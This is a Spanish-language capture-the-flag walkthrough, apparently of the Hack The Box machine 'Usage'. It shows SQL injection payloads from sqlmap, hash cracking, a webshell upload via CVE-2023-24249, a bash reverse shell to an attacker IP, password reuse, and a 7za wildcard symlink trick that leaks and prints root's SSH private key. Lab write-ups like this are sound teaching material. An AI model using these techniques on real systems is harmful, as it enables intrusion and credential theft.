<p align="center">
    <img src="imagenes/Usage.png" alt="Usage" width="400"  />
</p>
<br>

# Habilidades principales utilizadas
- Injección SQL.
- Descifrado de hashes.
- Abuso de subida de archivos.
- Búsqueda de credenciales.
- Abuso de privilegios de sudo.
<br>

# Enumeración
Iniciamos nuestra fase de enumeración realizando un ping a la máquina víctima. Por el TTL devuelto, podemos intuir que tiene un sistema operativo basado en Linux.

```bash
# ping -c 1 10.10.11.18                                                                                                         
PING 10.10.11.18 (10.10.11.18) 56(84) bytes of data.
64 bytes from 10.10.11.18: icmp_seq=1 ttl=63 time=49.1 ms

--- 10.10.11.18 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 49.110/49.110/49.110/0.000 ms
```
Ejecutamos la utilidad NMAP para descubrir servicios y su versión que tiene la máquina auditada expuestos.
```bash
Nmap scan report for 10.10.11.18
Host is up, received user-set (0.043s latency).

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFfdLKVCM7tItpTAWFFy6gTlaOXOkNbeGIN9+NQMn89HkDBG3W3XDQDyM5JAYDlvDpngF58j/WrZkZw0rS6YqS0=
|   256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHr8ATPpxGtqlj8B7z2Lh7GrZVTSsLb6MkU3laICZlTk
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Vemos que la petición web a la dirección http://10.10.11.18 intenta hacer una redirección hacia http://usage.htb. Para que nuestra máquina de atacante pueda seguir esa redirección, añadimos la entrada en nuestro fichero /etc/hosts.
```bash
127.0.0.1       localhost
127.0.1.1       kali

10.10.11.18 usage.htb                
```
Procedemos a realizar una enumeración de las tecnologías empleadas por la web. Entre otras tecnologías, el uso de Laravel parece la más relevante.
```bash
# whatweb http://usage.htb 
http://usage.htb [200 OK] Bootstrap[4.1.3], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.18], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```
<br>

> [!NOTE]
> Laravel es un framework de código abierto para desarrollar aplicaciones y servicios web con PHP. Su filosofía es desarrollar código PHP de forma elegante y simple, evitando el "código espagueti".

<br>

Abrimos la página web con nuestro navegador. Vemos que hay un enlace hacia http://admin.usage.htb, el cual intuimos que puede ser un portal de administración.
<p align="left">
    <img src="imagenes/usage_1.png" alt="usage_1" width="500"  />
</p>

Volvemos a modificar nuestro fichero /etc/hosts para contemplar este nuevo FQDN.
```bash
127.0.0.1       localhost
127.0.1.1       kali

10.10.11.18 usage.htb admin.usage.htb
```

Antes de saltar a revisar el panel de administración, seguimos enumerando la web principal. Vemos hay un enlace que lleva a http://usage.htb/forget-password. Esta web, parece que habilita al usuario la posibilidad de resetear su propia contraseña, enviando un correo electrónico a la cuenta de correo que el usuario tenga asociada. intentamos realizar una injección de SQL simple, añadiendo una ' al campo de correo electrónico. Vemos que la web muestra un error 500 como respuesta a la petición enviada.
<p align="left">
    <img src="imagenes/usage_2.png" alt="usage_2" width="500"  />
</p>
<p align="left">
    <img src="imagenes/usage_3.png" alt="usage_3" width="500"  />
</p>

<br>

# Análisis de vulnerabilidades

Parece que la web puede ser vulnerable a una injección SQL. Repetimos la operación, pero esta vez capturamos la petición mediante Burpsuite.
<p align="left">
    <img src="imagenes/usage_4.png" alt="usage_4" width="500"  />
</p>

Almacenamos el contenido de la petición en un fichero llamado request.txt. Posteriormente le pasaremos el fichero de la petición a SQLMap para intentar explotar la vulnerabilidad de Injección de SQL. Con el modificador -p le estamos indicando el campo que queremos que intente la injección.
```bash
# sqlmap -r requests.txt  --level 5 --risk 3 -p email --batch
<contenido omitido>
sqlmap identified the following injection point(s) with a total of 740 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=4u33vCKzMGK6WlzOlNaOKalDnmGti9bepeOdZuLp&email=test@test.es' AND 8583=(SELECT (CASE WHEN (8583=8583) THEN 8583 ELSE (SELECT 7061 UNION SELECT 4296) END))-- NGWH

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: _token=4u33vCKzMGK6WlzOlNaOKalDnmGti9bepeOdZuLp&email=test@test.es' AND 8195=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- eqGh
---
[09:57:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL > 5.0.12
<contenido omitido>
```
Ahora, intentamos enumerar las bases de datos que el servicio MySQL pueda contener. 
```bash
# sqlmap -r requests.txt  --level 5 --risk 3 -p email --dbs
<contenido omitido>
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
<contenido omitido>
```
Hacemos lo mismo con las tablas de la base de dados "usage_blog".
```bash
# sqlmap -r requests.txt  --level 5 --risk 3 -p email --batch -D usage_blog --tables
<contenido omitido>
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
<contenido omitido>
```

La base de datos admin_users nos llama la atención. Procedemos a su enumeración.
```bash
# sqlmap -r requests.txt  --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users --dump
<contenido omitido>
Database: usage_blog
Table: admin_users
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
<contenido omitido>
```
<br>

# Explotación y acceso
Mediante la explotación de la injección SQL, hemos obtenido un token. Vamos a intentar descrifrarlo. Para ello, lo guardamos en un fichero llamado hash.txt y usamos la utilidad John the Ripper.
```bash
# john -w=/usr/share/wordlists/rockyou.txt hash.txt
<contenido omitido>
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)    
<contenido omitido>
```

Ahora que tenemos el usuario (admin) y la contraseña (whatever1), comprobaremos si son válidas para acceder al panel de administración. Como podemos ver conseguimos ingresar en el panel.
<p align="left">
    <img src="imagenes/usage_5.png" alt="usage_5" width="500"  />
</p>

Revisando la información del dashboard, podemos observar que la aplicación usa laravel-admin 1.8.18. Una búsqueda en Internet sobre las vulnerabilidades de esta versión nos lleva hasta la vulnerabilidad CVE-2023-24249, la cual permite subir código arbitrario mediante el abuso de una panel de subida de archivos.

Navegamos hasta la URL http://admin.usage.htb/admin/auth/setting. En el campo avatar subimos una foto cualquiera, interceptando la petición con Burpsuite, modificando el campo filename y el contenido de la petición, para incrustar un código malicioso. Una vez realizado, permitimos que continue la petición.
<p align="left">
    <img src="imagenes/usage_7.png" alt="usage_7" width="500"  />
</p>

Volviendo a nuestro navegador web, veremos que ha subido el fichero correctamente, dando la posibilidad de averiguar en qué directorio web se ha almacenado si pulsamos sobre el icono que aparece en rojo en la siguiente imagen. 
<p align="left">
    <img src="imagenes/usage_6.png" alt="usage_6" width="500"  />
</p>

Realizamos una prueba de concepto, intentando ejecutar el comando id, y vemos que obtenemos una ejecución remota de comandos.
<p align="left">
    <img src="imagenes/usage_8.png" alt="usage_8" width="500"  />
</p>

En los siguientes pasos intentaremos ganar acceso a la máquina con una reverse shell. Para ello, nos ponemos en escucha con netcat en nuestra máquina de atacante y ejecutamos la siguiente llamada en el navegador.
```bash
http://admin.usage.htb/uploads/images/pwned.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.10/443 0>%261'
```

En nuestra máquina de atacante, obtendriamos la reverse shell que estábamos esperando.
```bash
# nc -nlvp 443     
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.18] 45074
bash: cannot set terminal process group (1225): Inappropriate ioctl for device
bash: no job control in this shell
dash@usage:/var/www/html/project_admin/public/uploads/images$ 
```
<br>

> [!WARNING]
> Es importante que todo el proceso de subida de la imagen, su manipulación con Burpsuite y la ejecución remota de comandos lo hagamos con cierta rapidez. Parece que hay un proceso interno de la máquina que elimina el archivo subido, teniendo que empezar de nuevo el proceso.

<br>

# Movimiento lateral
Una vez realizada el tratamiento de la TTY para trabajar más comodamente, revisamos los puertos en escucha que tiene la máquina víctima.
```bash
# netstat -putona | grep -i listen
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:2812          0.0.0.0:*               LISTEN      5588/monit           off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1279/nginx: worker   off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      -                    off (0.00/0/0)
```

El puerto TCP/2812 nos llama la atención. Una búsqueda en Internet nos revela que se trata de monit, que es un sistema de monitorización. 
En la propia documentación de [monit](https://mmonit.com/monit/documentation/monit.html) podemos leer que el fichero de configuración de la aplicación, por defecto, se encuentra en el directorio del trabajo del usuario que lo ejecuta. El comando lsof nos puede ayudar a saber con qué usuario se ejecuta el programa. Como podemos ver, parece que es el usuario dash.
```bash
dash@usage:/var/www/html/project_admin/public/uploads/images$ lsof -i:2812
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
monit   5699 dash    5u  IPv4 202937      0t0  TCP localhost:2812 (LISTEN)
```

Nos dirigimos al directorio del usuario y listamos su contenido. Efectivamente, encontramos el fichero .monitrc.
```bash
dash@usage:~$ cd /home/dash
dash@usage:~$ ls -la
total 52
drwxr-x--- 6 dash dash 4096 Nov  3 12:04 .
drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -> /dev/null
-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
drwx------ 3 dash dash 4096 Aug  7  2023 .cache
drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
-rw-r--r-- 1 dash dash    5 Nov  3 12:04 .monit.pid
-rw------- 1 dash dash 1192 Nov  3 12:05 .monit.state
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
<contenido omitido>
```

Leemos su contenido y encontramos una clave.
```bash
  GNU nano 6.2                                                                                                      .monitrc                                                                                                               
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd
<contenido omitido>
```

Revisamos que otros usuarios hay dados de alta en el sistema, leyendo el archivo /etc/passwd
```bash
dash@usage:~$ cat /etc/passwd | grep -i sh
root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
dash:x:1000:1000:dash:/home/dash:/bin/bash
xander:x:1001:1001::/home/xander:/bin/bash
```

Probamos si se ha reutilizado la contraseña encontrada en el fichero .monitrc, con el usuario xander, consiguiendo realizar un movimiento lateral.
```bash
dash@usage:~$ su xander
Password: 
xander@usage:/home/dash$ 
```

<br>

# Escalada de privilegios

Revisamos los permisos de sudo que tiene el usuario xander y vemos que puede ejecutar el programa /usr/bin/usage_management.
```bash
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
xander@usage:~$
```

Lo ejecutamos para ver de qué se trata.
```bash
xander@usage:~$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 
```

Ejecutamos el comando strings sobre el binario, para ver si consguimos averiguar qué tareas se están ejecutando por detrás.
La opción 1 (Project Backup) parace que navega hasta la carpeta /var/www/html y crea un comprimido con todos los ficheros que contiene. Vemos que usa el carácter "*" (comodín) que apriori no parece buena idea.
```bash
xander@usage:~$ strings /usr/bin/usage_management
<contenido omitido>
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
<contenido omitido>
```

Una búsqueda en [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z) nos revela una via potencial de aprovecharnos e intentar escalar privilegios.

Revisamos los permisos de /var/www/html y vemos que todos los usuarios del sistema tienen privilegios para escribir en dicho directorio, lo cual es perfecto para nuestro intento de escalada de privilegios.
```bash
xander@usage:~$ ls -la /var/www/
total 12
drwxr-xr-x  3 root root   4096 Apr  2  2024 .
drwxr-xr-x 14 root root   4096 Apr  2  2024 ..
drwxrwxrwx  4 root xander 4096 Apr  3  2024 html
xander@usage:~$ 
```

Ejecutaremos los siguientes comandos, para intentar obtener la id_rsa del usuario root
```bash
xander@usage:~$ cd /var/www/html/
xander@usage:~$ touch @id_rsa
xander@usage:~$ ln -s /root/.ssh/id_rsa id_rsa
```

Ejecutamos de nuevo el binario /usr/bin/usage_management, marcando la opción 1.
```bash
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1
<contenido omitido>
iles read from disk: 17948
Archive size: 54830574 bytes (53 MiB)

Scan WARNINGS for files and folders:

-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files
----------------
Scan WARNINGS: 7
```

Ya solo nos quedaria formatear correctamente la id_rsa, usándola para conectar por ssh, ganando acceso al sistema con los máximos privilegios.
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----
```
```bash
# chmod 600 id_rsa
# ssh root@10.10.11.18 -i id_rsa
<contenido omitido>
root@usage:~# whoami
root
root@usage:~# 
```









